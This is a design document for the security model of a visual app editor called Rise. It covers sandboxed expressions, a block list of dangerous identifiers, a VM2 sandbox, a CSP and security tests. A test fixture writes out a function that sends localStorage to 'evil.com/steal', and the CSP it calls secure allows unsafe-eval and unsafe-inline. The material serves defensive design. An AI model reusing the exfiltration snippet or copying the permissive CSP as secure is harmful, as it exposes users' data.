# Security Model

## Overview

Rise implements a **two-tier expression system** that balances user empowerment with security:

1. **🔒 Simple Expressions**: Sandboxed JavaScript for component properties (safe, limited)
2. **🔓 Custom Functions**: Full JavaScript power for reusable logic (powerful, user responsibility)

This approach gives users complete control when they need it, while protecting against accidental security issues in basic property expressions.

---

## Two-Tier Expression System

### Tier 1: Simple Expressions (Sandboxed)

**Use Case**: Dynamic component properties like text, styling, visibility

**Where Used**:
- Component property values
- Conditional styling
- Text interpolation
- Basic computations

**Security Model**: **Restricted JavaScript execution**

```javascript
// ✅ ALLOWED in simple expressions
user.name
user.firstName + ' ' + user.lastName
items.length > 0 ? 'Has items' : 'Empty'
theme === 'dark' ? 'bg-gray-900' : 'bg-white'
Math.round(price * 1.1)
new Date().getFullYear()

// ❌ BLOCKED in simple expressions
fetch('/api/data')
localStorage.setItem('key', 'value')
eval('malicious code')
document.createElement('script')
window.location = 'https://evil.com'
while(true) { }
```

### Tier 2: Custom Functions (Full Power)

**Use Case**: Reusable business logic, data processing, API calls

**Where Used**:
- Global function definitions
- Event handlers (onClick, onMount, etc.)
- Data transformations
- API integrations

**Security Model**: **Full JavaScript access** (user responsibility)

```javascript
// ✅ ALLOWED in custom functions (user's choice)
async function fetchUserData(userId) {
  const response = await fetch(`/api/users/${userId}`);
  const data = await response.json();
  localStorage.setItem('lastUser', userId);
  return data;
}

function processPayment(amount) {
  // Full access to APIs, storage, etc.
  return stripe.paymentIntents.create({ amount });
}

// Even this is allowed (with warnings):
function dangerousFunction() {
  eval(userInput); // AI will warn, but user can override
}
```

---

## Simple Expression Sandboxing

### Implementation Strategy

**AST-Based Parsing**: Use `@babel/parser` to analyze expressions before execution

```typescript
import { parse } from '@babel/parser';
import traverse from '@babel/traverse';

class ExpressionValidator {
  private blockedIdentifiers = [
    'fetch', 'XMLHttpRequest', 'WebSocket',
    'localStorage', 'sessionStorage', 'indexedDB',
    'eval', 'Function', 'setTimeout', 'setInterval',
    'document', 'window', 'global', 'process'
  ];

  private blockedMemberExpressions = [
    'window.*', 'document.*', 'global.*', 'process.*'
  ];

  validateExpression(code: string): ValidationResult {
    try {
      const ast = parse(code, {
        sourceType: 'module',
        plugins: ['jsx']
      });

      const violations: string[] = [];

      traverse(ast, {
        Identifier: (path) => {
          if (this.blockedIdentifiers.includes(path.node.name)) {
            violations.push(`Blocked identifier: ${path.node.name}`);
          }
        },

        CallExpression: (path) => {
          // Block dangerous function calls
          if (path.node.callee.type === 'Identifier') {
            if (this.blockedIdentifiers.includes(path.node.callee.name)) {
              violations.push(`Blocked function call: ${path.node.callee.name}`);
            }
          }
        },

        MemberExpression: (path) => {
          // Block dangerous property access
          const memberName = this.getMemberExpressionName(path.node);
          if (this.blockedMemberExpressions.some(blocked => 
            this.matchesPattern(memberName, blocked)
          )) {
            violations.push(`Blocked member access: ${memberName}`);
          }
        }
      });

      return {
        isValid: violations.length === 0,
        violations,
        ast
      };
    } catch (error) {
      return {
        isValid: false,
        violations: [`Syntax error: ${error.message}`],
        ast: null
      };
    }
  }
}
```

### Allowed Context in Simple Expressions

**Available Variables**:
```javascript
// Component context
props.*           // Component props
state.*           // Component state  
computed.*        // Computed values

// Global context (read-only)
global.*          // Global reactive variables
env.*             // Environment variables (NODE_ENV, etc.)

// Utility functions (curated safe list)
Math.*            // Math utilities
Date              // Date constructor and methods
JSON.*            // JSON parsing (safe subset)
String.*          // String methods
Array.*           // Array methods
Number.*          // Number methods
Object.*          // Object methods (safe subset)

// Custom functions (user-defined, but called safely)
formatDate(...)   // User's custom functions
validateEmail(...)
calculateTotal(...)
```

### Runtime Execution Safety

**VM2 Sandbox**: Execute expressions in isolated context

```typescript
import { VM } from 'vm2';

class ExpressionExecutor {
  private vm: VM;

  constructor() {
    this.vm = new VM({
      timeout: 100, // 100ms max execution time
      sandbox: {
        // Provide safe context
        props: {},
        state: {},
        global: {},
        Math,
        Date,
        JSON: {
          parse: JSON.parse,
          stringify: JSON.stringify
        },
        // User's custom functions (pre-validated)
        ...this.getCustomFunctions()
      }
    });
  }

  execute(expression: string, context: ExpressionContext): any {
    try {
      // Update sandbox with current context
      this.vm.sandbox.props = context.props;
      this.vm.sandbox.state = context.state;
      this.vm.sandbox.global = context.global;

      // Execute with timeout
      return this.vm.run(expression);
    } catch (error) {
      if (error.message.includes('Script execution timed out')) {
        throw new Error('Expression took too long to execute');
      }
      throw error;
    }
  }
}
```

---

## Custom Function Security

### Full Power with Responsibility

Custom functions have **no restrictions** - they can:

- ✅ Make HTTP requests (`fetch`, `axios`)
- ✅ Access browser APIs (`localStorage`, `sessionStorage`)
- ✅ Manipulate DOM (`document.*`)
- ✅ Use any npm packages
- ✅ Run async operations
- ✅ Access Node.js APIs (in Electron context)

### AI Security Review

When users write custom functions, AI provides security guidance:

```typescript
// Example custom function
function saveUserPreferences(prefs) {
  localStorage.setItem('userPrefs', JSON.stringify(prefs));
  
  // AI would flag this:
  fetch('/api/track-user', {
    method: 'POST',
    body: JSON.stringify({ prefs, timestamp: Date.now() })
  });
}
```

**AI Review Output**:
```
🤖 Security Review:

✅ Good Practices:
- Using JSON.stringify for safe serialization
- Local storage for user preferences

⚠️ Security Concerns:
- Network request to '/api/track-user' without user consent
- Sending user preferences to external API
- No error handling for network failures

💡 Suggestions:
- Add user consent before tracking
- Implement error handling
- Consider user privacy preferences

User Decision: [Accept Suggestions] [Override with Reason] [Ignore]
```

### Custom Function Triggers

Custom functions can be triggered by system events:

```json
{
  "globalFunctions": {
    "initializeApp": {
      "code": "function initializeApp() { /* setup code */ }",
      "triggers": ["app:mount"]
    },
    
    "trackUserAction": {
      "code": "function trackUserAction(action) { /* analytics */ }",
      "triggers": ["component:click", "component:mount"]
    },
    
    "syncUserData": {
      "code": "async function syncUserData() { /* sync logic */ }",
      "triggers": ["global:currentUser:changed"]
    }
  }
}
```

**Available Triggers**:
- `app:mount`, `app:unmount`
- `component:mount`, `component:unmount`
- `component:click`, `component:hover`, `component:focus`
- `global:{variableName}:changed`
- `route:changed`
- `timer:interval:{seconds}`

---

## Content Security Policy

### Generated Project CSP

Rise-generated projects include a secure CSP by default:

```html
<!-- In generated index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self' https:;
">
```

**Why `'unsafe-eval'`?**: Required for custom functions and expression evaluation
**User Control**: CSP can be customized in project settings

### Electron App Security

The Rise editor itself uses strict security:

```typescript
// Main process
new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    enableRemoteModule: false,
    webSecurity: true,
    allowRunningInsecureContent: false
  }
});

// Preload script exposes limited APIs
contextBridge.exposeInMainWorld('riseAPI', {
  // Only expose necessary functions
  saveProject: (data) => ipcRenderer.invoke('project:save', data),
  loadProject: (path) => ipcRenderer.invoke('project:load', path),
  // No direct file system access from renderer
});
```

---

## API Security

### AI Provider API Keys

**Storage**: Encrypted in system keychain
```typescript
import keytar from 'keytar';

class APIKeyManager {
  async storeKey(provider: string, apiKey: string) {
    await keytar.setPassword('rise-editor', `${provider}-api-key`, apiKey);
  }

  async getKey(provider: string): Promise<string | null> {
    return await keytar.getPassword('rise-editor', `${provider}-api-key`);
  }
}
```

**Usage**: Never logged or stored in plaintext

### User Code Privacy

**Problem**: Custom functions might contain sensitive business logic

**Solution**: Code sanitization before AI review

```typescript
class CodeSanitizer {
  sanitizeForAI(code: string): string {
    return code
      .replace(/api[_-]?key['\s]*[:=]['\s]*['"]\w+['"]/gi, 'API_KEY="[REDACTED]"')
      .replace(/password['\s]*[:=]['\s]*['"]\w+['"]/gi, 'password="[REDACTED]"')
      .replace(/secret['\s]*[:=]['\s]*['"]\w+['"]/gi, 'secret="[REDACTED]"')
      .replace(/token['\s]*[:=]['\s]*['"]\w+['"]/gi, 'token="[REDACTED]"')
      // Remove actual API endpoints
      .replace(/https?:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g, 'https://api.example.com');
  }
}
```

---

## User Education

### Security Warnings in UI

**Simple Expressions**: Clear about limitations
```
┌─────────────────────────────────────────────┐
│ 🔒 Simple Expression Editor                │
├─────────────────────────────────────────────┤
│ user.name + ' (' + user.role + ')'         │
│                                             │
│ ℹ️ Safe Mode: No network access, no storage │
│ For complex logic, use Custom Functions     │
│                                             │
│ [✓ Valid] [Apply] [Use Custom Function]     │
└─────────────────────────────────────────────┘
```

**Custom Functions**: Clear about power and responsibility
```
┌─────────────────────────────────────────────┐
│ 🔓 Custom Function Editor                   │
├─────────────────────────────────────────────┤
│ function fetchUserData(id) {                │
│   return fetch(`/api/users/${id}`)         │
│     .then(r => r.json());                  │
│ }                                           │
│                                             │
│ ⚠️ Full Power: Can access APIs, storage,    │
│    and all browser capabilities            │
│                                             │
│ 🤖 AI Security Review: [Request Review]     │
│ [Save] [Test] [Security Guidelines]         │
└─────────────────────────────────────────────┘
```

### Security Guidelines

**Built-in Help System**:
```
Security Best Practices:

✅ DO:
- Validate user inputs in custom functions
- Use HTTPS for API calls
- Store sensitive data securely (not in localStorage)
- Handle errors gracefully
- Follow principle of least privilege

❌ DON'T:
- Put API keys directly in code
- Trust user input without validation
- Store passwords in plain text
- Ignore error handling
- Grant unnecessary permissions

💡 When in doubt, ask for AI security review!
```

---

## Performance Security

### Resource Limits

**Expression Execution**:
- ⏱️ **Timeout**: 100ms per expression
- 💾 **Memory**: 10MB sandbox limit
- 🔄 **Loops**: Detect infinite loops
- 📊 **Complexity**: Warn about expensive operations

**Custom Function Monitoring**:
```typescript
class PerformanceMonitor {
  async executeWithLimits(fn: Function, args: any[]) {
    const startTime = performance.now();
    const startMemory = this.getMemoryUsage();

    try {
      const result = await Promise.race([
        fn(...args),
        this.timeoutPromise(5000) // 5 second limit
      ]);

      const executionTime = performance.now() - startTime;
      const memoryUsed = this.getMemoryUsage() - startMemory;

      // Log performance metrics
      this.logMetrics(fn.name, { executionTime, memoryUsed });

      // Warn about slow functions
      if (executionTime > 1000) {
        this.warnSlowFunction(fn.name, executionTime);
      }

      return result;
    } catch (error) {
      this.logError(fn.name, error);
      throw error;
    }
  }
}
```

---

## Testing Security

### Automated Security Tests

```typescript
describe('Expression Security', () => {
  test('blocks dangerous function calls', () => {
    const dangerous = [
      'fetch("/api/delete-all")',
      'localStorage.clear()',
      'eval("malicious code")',
      'document.createElement("script")'
    ];

    dangerous.forEach(expr => {
      const result = validator.validateExpression(expr);
      expect(result.isValid).toBe(false);
      expect(result.violations.length).toBeGreaterThan(0);
    });
  });

  test('allows safe expressions', () => {
    const safe = [
      'user.name',
      'items.length > 0',
      'Math.round(price * 1.1)',
      'formatDate(createdAt)'
    ];

    safe.forEach(expr => {
      const result = validator.validateExpression(expr);
      expect(result.isValid).toBe(true);
    });
  });
});

describe('Custom Function Security', () => {
  test('AI security review detects issues', () => {
    const dangerousFunction = `
      function stealData() {
        fetch('https://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify(localStorage)
        });
      }
    `;

    const review = aiSecurityReviewer.analyze(dangerousFunction);
    expect(review.concerns.length).toBeGreaterThan(0);
    expect(review.concerns[0]).toContain('external API');
  });
});
```

### Manual Security Review

**Before Release**:
- [ ] Penetration testing of expression sandbox
- [ ] Custom function privilege escalation testing
- [ ] AI code sanitization effectiveness
- [ ] Generated project CSP validation
- [ ] Electron app security audit

---

## Incident Response

### Security Vulnerability Discovery

**Process**:
1. **Immediate**: Disable affected feature in latest version
2. **Investigation**: Assess scope and impact
3. **Fix**: Implement and test fix
4. **Communication**: Notify users and provide mitigation steps
5. **Prevention**: Update testing to prevent similar issues

### User Report Handling

**Security Issue Reporting**:
- 📧 Dedicated email: security@rise-editor.com
- 🔒 Encrypted communication encouraged
- ⏱️ Response within 24 hours
- 🎁 Responsible disclosure rewards

---

## Future Security Enhancements

### Planned Improvements

**Enhanced Sandboxing**:
- WebAssembly-based isolation for expressions
- Fine-grained permission system for custom functions
- User-defined security policies per project

**AI Security Improvements**:
- Automated vulnerability detection in custom functions
- Security best practice suggestions
- Real-time threat detection

**Enterprise Security**:
- SSO integration
- Audit logging
- Role-based access control
- Air-gapped deployment options

---

## Conclusion

Rise's two-tier security model provides the perfect balance:

- **🔒 Safe by Default**: Simple expressions are sandboxed and secure
- **🔓 Power When Needed**: Custom functions give users full control
- **🤖 AI Guidance**: Security review helps users make informed decisions
- **📚 Education**: Clear guidelines help users understand security implications

This approach empowers users without compromising security, making Rise suitable for both prototyping and production applications.

---

**Last Updated**: October 25, 2025  
**Security Model Version**: 1.0  
**Next Review**: Post-MVP security audit

---

**See Also**:
- [Expression System](./EXPRESSION_SYSTEM.md) - Technical implementation details
- [Component Schema](./COMPONENT_SCHEMA.md) - How security is represented in manifest
- [MVP Roadmap](./MVP_ROADMAP.md) - Security implementation timeline